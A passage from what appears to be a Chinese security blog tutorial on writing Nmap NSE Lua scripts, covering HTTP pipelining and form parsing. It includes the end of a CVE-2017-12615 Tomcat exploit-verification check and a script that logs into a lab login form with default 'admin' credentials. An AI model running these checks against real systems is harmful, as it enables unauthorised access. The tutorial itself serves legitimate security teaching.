		<span class="kd">local</span> <span class="n">response</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">shell_name</span><span class="p">)</span>
		<span class="k">if</span><span class="p">(</span><span class="n">response</span> <span class="ow">and</span> <span class="n">http</span><span class="p">.</span><span class="n">response_contains</span><span class="p">(</span><span class="n">response</span><span class="p">,</span><span class="s2">"CVE%-2017%-12615"</span><span class="p">)</span> <span class="p">)</span><span class="k">then</span>
			<span class="k">return</span> <span class="n">status</span>
		<span class="k">end</span>
		<span class="k">return</span> <span class="kc">false</span>
	<span class="k">end</span>
	<span class="k">return</span> <span class="kc">false</span>
<span class="k">end</span>
<span class="err">……</span>
</code></pre></div></div>

<p>脚本执行结果与上一节中的内容相同，只是多了一次GET请求，为了让读者真正理解这个脚本的执行过程，下面对比一下wireshark流量：</p>

<ul>
  <li>优化前：</li>
</ul>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/54248cd5201053a46cada7179accdbeb.png" alt="2019-04-24-10-19-52" /></p>

<p>首先脚本直接向80端口发送了一个PUT请求，然后服务器响应405，漏洞利用失败。</p>

<p>紧接着脚本又请求了8080端口，服务器响应201，证明漏洞利用成功。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/c66aae5cd70512ec0472b2c2a7ffaeb8.png" alt="2019-04-24-10-20-01" /></p>

<ul>
  <li>优化后：</li>
</ul>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/14d38a0b6a2422aa48136513f1c7f171.png" alt="2019-04-24-10-20-09" /></p>

<p>通过向8080端口发送PUT请求成功利用后，又向写入文件发送了一次GET请求，获取响应内容，进行字符串匹配，达到更加深度的验证漏洞是否利用成功。</p>

<h2 id="0x08-并发http请求">0x08 并发HTTP请求</h2>

<p>这里说的并发HTTP请求的原理是与目标主机建立一个socket，在每一次发送报文后都不会断开（除了最后一次请求）。平常我们在扩展脚本中调用一个http.get函数，将会返回一个响应表，代表已经获取了目标主机的响应报文，当返回响应表之前就已经与目标主机断开了连接。下一次调用http.get时，还需要进行一次建立连接的过程，导致我们会消耗一定的时间。如果一个扩展脚本需要发送多次请求，可以考虑使用http.pipeline_add与http.pipline_go配合使用。</p>

<p>下面就来介绍这两个函数如何配合使用：</p>

<p>http.pipeline_add参数如下：</p>

<ul>
  <li>path : 请求路径</li>
  <li>options : 用于设置请求相关的Cookie、超时时间、header</li>
  <li>all_requests : （可选值），如果是第一次调用，则为nil，若不是第一次调用，需要传入上一次http.pipeline_add的返回值</li>
  <li>method : HTTP方法（GET、POST、HEAD、PUT等），默认为GET</li>
</ul>

<p>返回值：</p>

<ul>
  <li>一个请求表</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>|   
|     path: 
|     options: 
|       header: 
|         Connection: keep-alive
|_    method: GET
</code></pre></div></div>

<p>可以有多个，下标从1开始，如果需要查看这个请求列表的结构，可以直接在action函数中return出http.pipeline_add的返回值，代码演示如下：</p>

<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">……</span>
<span class="n">action</span> <span class="o">=</span> <span class="k">function</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
	<span class="kd">local</span> <span class="n">all_requests</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="n">pipeline_add</span><span class="p">(</span><span class="s2">"/index.jsp"</span><span class="p">,</span><span class="kc">nil</span><span class="p">,</span><span class="kc">nil</span><span class="p">,</span><span class="s2">"GET"</span><span class="p">)</span>
	<span class="n">all_requests</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="n">pipeline_add</span><span class="p">(</span><span class="s2">"/docs/changelog.html"</span><span class="p">,</span><span class="kc">nil</span><span class="p">,</span><span class="n">all_requests</span><span class="p">,</span><span class="s2">"GET"</span><span class="p">)</span>
	<span class="k">return</span> <span class="n">all_requests</span>
<span class="k">end</span>
<span class="err">……</span>
</code></pre></div></div>

<p>执行结果：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2a93c8afc0b2e2e68d79b59506d08424.png" alt="2019-04-24-10-21-19" /></p>

<p>因为调用了两次http.pipeline_add，所以会产生两个请求列表队列元素，如果只想获取第一个请求队列元素，可以return all_requests[1]。</p>

<p>下面我们要开始将队列交给http.pipeline_go函数，由它来完成所有请求，函数参数如下：</p>

<ul>
  <li>host : host表</li>
  <li>port : port 表</li>
  <li>all_requests : 由http.pipeline_add函数装在好的请求列表</li>
</ul>

<p>返回值：</p>
<ul>
  <li>response_list : 响应列表</li>
</ul>

<p>示例代码：</p>

<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="err">……</span>
<span class="n">action</span> <span class="o">=</span> <span class="k">function</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
	<span class="kd">local</span> <span class="n">status_lines</span> <span class="o">=</span> <span class="n">stdnse</span><span class="p">.</span><span class="n">output_table</span><span class="p">()</span>
	<span class="kd">local</span> <span class="n">all_requests</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="n">pipeline_add</span><span class="p">(</span><span class="s2">"/index.jsp"</span><span class="p">,</span><span class="kc">nil</span><span class="p">,</span><span class="kc">nil</span><span class="p">,</span><span class="s2">"GET"</span><span class="p">)</span>
	<span class="n">all_requests</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="n">pipeline_add</span><span class="p">(</span><span class="s2">"/docs/changelog.html"</span><span class="p">,</span><span class="kc">nil</span><span class="p">,</span><span class="n">all_requests</span><span class="p">,</span><span class="s2">"GET"</span><span class="p">)</span>
	<span class="kd">local</span> <span class="n">all_response</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="n">pipeline_go</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">all_requests</span><span class="p">)</span>
	<span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">resp</span> <span class="k">in</span> <span class="nb">ipairs</span><span class="p">(</span><span class="n">all_response</span><span class="p">)</span><span class="k">do</span>
		<span class="n">status_lines</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">resp</span><span class="p">[</span><span class="s2">"status-line"</span><span class="p">]</span>
	<span class="k">end</span>
	<span class="k">return</span> <span class="n">status_lines</span>
<span class="k">end</span>
<span class="err">……</span>
</code></pre></div></div>

<p>这段代码中添加了两个请求队列元素，分别是：</p>

<ul>
  <li>/index.jsp</li>
  <li>/docs/changelog.html</li>
</ul>

<p>将队列交给http.pipeline_go函数后，返回一个响应列表，all_response[1]对应index.jsp的响应表，all_response[2]对应/docs/changelog.html的响应表。因此可以使用迭代，将每个请求的某个字段放入一个输出表里，本次示例是取得了两次请求队status-line。</p>

<p>执行结果：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/fe4b76a55437255e727407e488952db7.png" alt="2019-04-24-10-22-31" /></p>

<h2 id="0x09-表单操作">0x09 表单操作</h2>

<p>关于表单操作，在爬虫、漏洞扫描、爆破时用的较多，一般要先取回目标主机的响应body，然后字符串匹配获得表单结构。但是这些操作在Nmap中已经提供了一些方法，接下来就让我们一起学习http包中的表单操作函数吧。</p>

<p>http.grab_forms 用于在响应内容中查找表单，并返回一个form_list表，参数如下：</p>

<ul>
  <li>body : 响应表中的body</li>
</ul>

<p>返回值：</p>

<ul>
  <li>form_list : 表单列表</li>
</ul>

<blockquote>
  <p>获取页面中的表单列表</p>
</blockquote>

<p>我使用apache和php搭建了一个简单的登录界面，尝试通过nmap的扩展脚本来获取表单列表。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/bb6a9f803b4f391126c2f24ac5af7e24.png" alt="2019-04-24-10-23-28" /></p>

<p>查看一下HTML源码：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/36979ae8c35249d101c334d1868365ec.png" alt="2019-04-24-10-23-36" /></p>

<p>可以发现页面中这个表单是提交到index.php的，并且提供了两个输入值，分别是username和password，这种情况下我们完全可以采用lua的字符串匹配模式获得input的name，但是如果页面上有很多表单，这就会增加我们处理数据的压力。</p>

<p>我们来试试http.grab_forms函数：</p>

<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">local</span> <span class="n">http</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">"http"</span>
<span class="n">prerule</span><span class="o">=</span><span class="k">function</span><span class="p">()</span>
<span class="k">end</span>
<span class="n">hostrule</span><span class="o">=</span><span class="k">function</span><span class="p">(</span><span class="n">host</span><span class="p">)</span>
	<span class="k">return</span> <span class="kc">false</span>
<span class="k">end</span>
<span class="n">portrule</span><span class="o">=</span><span class="k">function</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
	<span class="k">if</span><span class="p">(</span><span class="n">port</span><span class="p">.</span><span class="n">number</span> <span class="o">==</span> <span class="mi">80</span><span class="p">)</span><span class="k">then</span>
		<span class="k">return</span> <span class="kc">true</span>
	<span class="k">end</span>
<span class="k">end</span>
<span class="n">action</span> <span class="o">=</span> <span class="k">function</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
	<span class="kd">local</span> <span class="n">response</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="s2">"/index.php"</span><span class="p">)</span>
	<span class="kd">local</span> <span class="n">login_forms</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="n">grab_forms</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">body</span><span class="p">)</span>
	<span class="k">return</span> <span class="n">login_forms</span>
<span class="k">end</span>
<span class="n">postrule</span><span class="o">=</span><span class="k">function</span><span class="p">()</span>
<span class="k">end</span>

</code></pre></div></div>

<p>因为http.grab_forms函数接收的是响应表的body，所以需要调用http.get函数将响应表取到，再把响应表的body传递进去。</p>

<p>执行结果：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/6d2f20e17da8c71252947429d2312e29.png" alt="2019-04-24-10-24-01" /></p>

<p>目前是获得了一个登录表单，注意：返回的是一个表单列表，而不是只能获得一个表单，在登录页面中新添加一个表单后：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/212338d018c5c84d5f36c8bc6d7e9776.png" alt="2019-04-24-10-24-07" /></p>

<p>再执行脚本观察一下：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/37a8d032a141639df688c71eec776976.png" alt="2019-04-24-10-24-15" /></p>

<p>如果还想进一步获得input的name值，就要学习另外一个函数—— http. parse_form</p>

<p>参数如下：</p>

<ul>
  <li>form : 表单的明文</li>
</ul>

<p>返回值：</p>

<ul>
  <li>一个带键的表，分别有：action、method、fields</li>
</ul>

<p>示例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>| test: 
|   action: /index.php
|   method: post
|   fields: 
|     
|       type: text
|       value: test
|       name: username
|     
|       type: text
|       value: test
|_      name: password
</code></pre></div></div>

<p>注意：fields是一个table，不是一个字符串，里面有表单的多个字段</p>

<blockquote>
  <p>需求：爬取页面表单，并尝试登录</p>
</blockquote>

<p>当前页面有两个表单，先尝试一个表单来登录，整体步骤如下：</p>

<ol>
  <li>抓取表单</li>
  <li>解析表单</li>
  <li>拼接字段</li>
  <li>登录</li>
  <li>判断是否登录成功</li>
</ol>

<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">action</span> <span class="o">=</span> <span class="k">function</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
	<span class="kd">local</span> <span class="n">login_table</span> <span class="o">=</span> <span class="p">{}</span>
	<span class="kd">local</span> <span class="n">response</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="s2">"/index.php"</span><span class="p">)</span>
	<span class="kd">local</span> <span class="n">login_forms</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="n">grab_forms</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">body</span><span class="p">)</span>
	<span class="kd">local</span> <span class="n">form</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="n">parse_form</span><span class="p">(</span><span class="n">login_forms</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
	<span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">name</span> <span class="k">in</span> <span class="nb">ipairs</span><span class="p">(</span><span class="n">form</span><span class="p">.</span><span class="n">fields</span><span class="p">)</span><span class="k">do</span>
		<span class="n">login_table</span><span class="p">[</span><span class="n">form</span><span class="p">.</span><span class="n">fields</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">name</span><span class="p">]</span><span class="o">=</span><span class="s2">"admin"</span>
	<span class="k">end</span>
	<span class="kd">local</span> <span class="n">login_response</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="s2">"/index.php"</span><span class="p">,</span><span class="kc">nil</span><span class="p">,</span><span class="kc">nil</span><span class="p">,</span><span class="n">login_table</span><span class="p">)</span>
	<span class="k">if</span><span class="p">(</span><span class="n">http</span><span class="p">.</span><span class="n">response_contains</span><span class="p">(</span><span class="n">login_response</span><span class="p">,</span><span class="s2">"success"</span><span class="p">))</span><span class="k">then</span>
		<span class="n">login_table</span><span class="p">.</span><span class="n">login_status</span> <span class="o">=</span> <span class="kc">true</span>
		<span class="k">return</span> <span class="n">login_table</span>
	<span class="k">end</span>
	<span class="n">login_tabke</span><span class="p">.</span><span class="n">login_status</span> <span class="o">=</span> <span class="kc">false</span>
	<span class="k">return</span> <span class="n">login_table</span>
<span class="k">end</span>
</code></pre></div></div>

<p>本段代码首先获取index.php的响应表，通过http.grab_forms函数获得登录，将返回值（第一个表单）交给http.parse_from，取得表单fields（字段），然后遍历每一个字段的name，把它填入一个table，最后执行http.post函数，刚好http.post的data可以是一个table也可以是一个字符串。请求完毕后得到登录的响应结果，再由http.response_contains判断是否登录成功，登录成功会出现success字样提示。</p>

<p>为了解决疑惑，我贴出index.php的源代码：</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="cp">&lt;?php</span>
<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"username"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"password"</span><span class="p">]))</span>
<span class="p">{</span>
	<span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">"username"</span><span class="p">];</span>
	<span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">"password"</span><span class="p">];</span>
	<span class="k">if</span><span class="p">(</span><span class="nv">$username</span> <span class="o">==</span> <span class="s2">"admin"</span> <span class="o">&amp;&amp;</span> <span class="nv">$password</span> <span class="o">==</span> <span class="s2">"admin"</span><span class="p">){</span>
		<span class="k">echo</span> <span class="s2">"login success !"</span><span class="p">;</span>
	
	<span class="p">}</span><span class="k">else</span><span class="p">{</span>
		<span class="k">echo</span> <span class="s2">"login failed !"</span><span class="p">;</span>
	
	<span class="p">}</span>

<span class="p">}</span><span class="k">else</span><span class="p">{</span>
	<span class="k">echo</span> <span class="s2">"please login !"</span><span class="p">;</span>

<span class="p">}</span>

<span class="cp">?&gt;</span>
<span class="nt">&lt;hr/&gt;</span>
<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"/index.php"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
username:<span class="nt">&lt;br&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"username"</span> <span class="na">value=</span><span class="s">"test"</span><span class="nt">&gt;</span>
<span class="nt">&lt;br&gt;</span>
password:<span class="nt">&lt;br&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"password"</span> <span class="na">value=</span><span class="s">"test"</span><span class="nt">&gt;</span>
<span class="nt">&lt;br&gt;&lt;br&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>
……
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>下一章：DNS包的使用</p>

<p>正向解析、反向解析、发送DNS请求等</p>
-->
          本来是想写成一本书的，但是可能断断续续没有很好的产出，我只能以文章的形式分享出来了，希望我的研究成果能够给大家带来便利。—— 作者：倾旋
          <p>
            <a class="post-link" href="/archivers/2019-04-24/4">Read More »</a>
          </p>
        </div>
      </li>
    
  </ul>
  
  <!-- Pagination links -->
<div class="pagination">
  
    <a href="/page7" class="previous">PREV</a>
  
  <span class="page_number ">8 of 34</span>
  
    <a href="/page9" class="next">NEXT</a>
  
</div>

</div>

        </div>
        <div class="col-second">
          <div class="col-box col-box-author">
  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
  <div class="col-box-title name">倾旋</div>
  <p>特点：爪子长、个子高、身体瘦弱
</p>
  <p class="contact">
    
    <a href="https://github.com/Rvn0xsy">GitHub</a>
    
    
    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
    
    
    <a href="mailto:rvn0xsy@gmail.com">Email</a>
    
    <a href="#">微信</a>
    
  </p>
</div>

<div class="col-box">
  <div class="col-box-title">Newest Posts</div>
  <ul class="post-list">
    
      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
    
      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
    
      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
    
      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
    
      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
    
      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
    
    <li><a class="post-link" href="/posts/">更多....</a></li>
  </ul>
</div>

<div class="col-box post-toc hide">
  <div class="col-box-title">TOC</div>
</div>

        </div>
      </div>
    </div>

    <footer class="footer">
<div class="wrapper">
© 2021 倾旋
</div>
</footer>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-158746438-1');
</script>

<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
<script src="/js/easybook.js"></script>


  </body>

</html>
